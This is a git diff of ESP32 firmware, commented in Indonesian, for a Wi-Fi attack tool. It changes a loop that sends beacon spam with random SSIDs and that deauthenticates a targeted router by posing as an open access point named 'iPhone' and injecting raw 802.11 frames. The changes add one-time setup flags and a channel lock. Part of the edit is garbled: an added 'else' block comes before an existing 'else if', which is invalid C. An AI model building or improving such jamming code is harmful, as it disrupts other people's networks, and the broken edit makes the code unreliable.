@@ -50,7 +50,11 @@ uint8_t disasFrame[26]  = { 0xa0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff
 void loopWiFi(void * pvParameters) {
   for(;;) {
    if (isSpamming) {
-   esp_wifi_set_promiscuous(true);
+   if (!spamUdahSetup) {
+        esp_wifi_set_promiscuous(true);
+        spamUdahSetup = true;
+      }
+   
       if (aktifModeSpam == 1) {
          // --- PELURU BEACON SPAM ---
          // Tembak paket beacon dengan SSID random
@@ -78,6 +82,8 @@ void loopWiFi(void * pvParameters) {
       
       
       vTaskDelay(50 / portTICK_PERIOD_MS); // Biar gak crash
+    } else {
+      spamUdahSetup = false; // Reset kalau spam dimatiin
     } else if (triggerScan) {
       sedang_scan = true;
       
@@ -108,16 +114,20 @@ void loopWiFi(void * pvParameters) {
       triggerScan = false; // Matiin pelatuknya
     } else if (isDeauthing && adaTarget) {
     // 1. PINDAH MODE KE AP (Biar lebih sakti kayak GhostESP)
-    wifi_config_t ap_config = {};
-    const char* fakeName = "iPhone";
-    memcpy(ap_config.ap.ssid, fakeName, strlen(fakeName));
-    ap_config.ap.ssid_len = strlen(fakeName);
-    ap_config.ap.authmode = WIFI_AUTH_OPEN; // Biar gak ribet
-    ap_config.ap.max_connection = 0;        // Gak nerima tamu, cuma nembak doang
+    if (!deauthUdahSetup) {
+        wifi_config_t ap_config = {};
+        const char* fakeName = "iPhone";
+        memcpy(ap_config.ap.ssid, fakeName, strlen(fakeName));
+        ap_config.ap.ssid_len = strlen(fakeName);
+        ap_config.ap.authmode = WIFI_AUTH_OPEN; 
 
-    esp_wifi_set_mode(WIFI_MODE_AP);
-    esp_wifi_set_config(WIFI_IF_AP, &ap_config); 
-    esp_wifi_set_promiscuous(true);
+        esp_wifi_set_mode(WIFI_MODE_AP);
+        esp_wifi_set_config(WIFI_IF_AP, &ap_config); 
+        esp_wifi_set_promiscuous(true);
+        esp_wifi_set_channel(targetTerkunci.channel, WIFI_SECOND_CHAN_NONE);
+        
+        deauthUdahSetup = true;
+      }
     
     uint8_t targetMac[6]; // MAC Router
     stringToMac(targetTerkunci.mac, targetMac);
@@ -145,7 +155,9 @@ void loopWiFi(void * pvParameters) {
 
     
     vTaskDelay(50 / portTICK_PERIOD_MS); 
-}
+} else {
+      deauthUdahSetup = false; // Reset kalau deauth dimatiin
+    }
 vTaskDelay(10 / portTICK_PERIOD_MS); 
 }
 }
@@ -174,7 +186,7 @@ void sendBeacon(String ssid) {
     for (int ch = 1; ch <= 13; ch++) {
         esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
         esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, 38 + ssidLen + sizeof(postSSID), false);
-        delayMicroseconds(100); 
+        vTaskDelay(1); 
     }
 }
 
